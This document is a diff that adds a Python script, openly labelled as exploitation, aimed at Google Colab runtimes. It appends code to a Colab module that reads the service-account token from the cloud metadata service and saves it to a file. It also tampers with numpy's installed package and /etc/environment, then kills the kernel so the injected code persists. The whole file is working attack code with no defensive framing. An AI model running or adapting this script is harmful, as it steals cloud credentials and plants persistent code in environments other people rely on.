@@ -1,0 +1,113 @@
+import os
+import time
+import subprocess
+import requests
+
+# 1. Locate Colab Module Paths Dynamically
+def locate_module(module_name):
+    try:
+        import importlib.util
+        spec = importlib.util.find_spec(module_name)
+        if spec and spec.origin:
+            print(f"[+] Found module '{module_name}' at {spec.origin}")
+            return spec.origin
+        else:
+            print(f"[-] Module '{module_name}' not found.")
+            return None
+    except Exception as e:
+        print(f"[-] Error locating module '{module_name}': {e}")
+        return None
+
+
+# 2. Inject Persistent Malicious Code
+def inject_persistent_code(module_path):
+    try:
+        malicious_code = """
+import os
+import requests
+# Fetch metadata tokens
+def steal_metadata():
+    headers = {"Metadata-Flavor": "Google"}
+    try:
+        response = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", headers=headers)
+        with open('/tmp/stolen_token.txt', 'w') as f:
+            f.write(response.text)
+    except Exception as e:
+        print(f"[-] Failed to steal metadata: {e}")
+steal_metadata()
+"""
+        with open(module_path, "a") as f:
+            f.write(malicious_code)
+        print(f"[+] Injected persistent malicious code into {module_path}")
+    except Exception as e:
+        print(f"[-] Failed to inject persistent code: {e}")
+
+
+# 3. Modify Shared Library
+def modify_shared_library():
+    target_library = "/usr/local/lib/python3.10/site-packages/numpy/__init__.py"
+    try:
+        malicious_code = "\nprint('Malicious Code Executed')\n"
+        with open(target_library, "a") as f:
+            f.write(malicious_code)
+        print(f"[+] Modified shared library {target_library}")
+    except Exception as e:
+        print(f"[-] Failed to modify shared library: {e}")
+
+
+# 4. Modify Environment Variables
+def modify_environment_variables():
+    try:
+        with open("/etc/environment", "a") as f:
+            f.write("ENABLE_DIRECTORYPREFETCHER=0\n")
+            f.write("USE_AUTH_EPHEM=0\n")
+            f.write("INJECTED_VAR=HackedValue\n")
+        print("[+] Environment variables modified in /etc/environment")
+    except Exception as e:
+        print(f"[-] Failed to modify environment variables: {e}")
+
+
+# 5. Restart the Kernel
+def restart_kernel():
+    try:
+        print("[+] Restarting kernel...")
+        subprocess.call(["pkill", "-f", "colab_kernel_"])
+        print("[+] Kernel restart triggered")
+    except Exception as e:
+        print(f"[-] Failed to restart kernel: {e}")
+
+
+# 6. Verify Injection
+def verify_injection(module_path):
+    try:
+        with open(module_path, "r") as f:
+            content = f.read()
+        print(f"[+] Current content of {module_path} (last 500 chars):")
+        print(content[-500:])
+    except Exception as e:
+        print(f"[-] Verification failed: {e}")
+
+
+# Execute Exploitation
+if __name__ == "__main__":
+    print("[*] Starting exploitation script...")
+
+    # Locate target modules
+    reprs_path = locate_module("google.colab._reprs")
+
+    # Perform injections
+    if reprs_path:
+        inject_persistent_code(reprs_path)
+    modify_shared_library()
+
+    # Modify environment variables
+    modify_environment_variables()
+
+    # Restart kernel
+    restart_kernel()
+
+    # Verify injections
+    if reprs_path:
+        verify_injection(reprs_path)
+
+    print("[*] Exploitation script completed.")
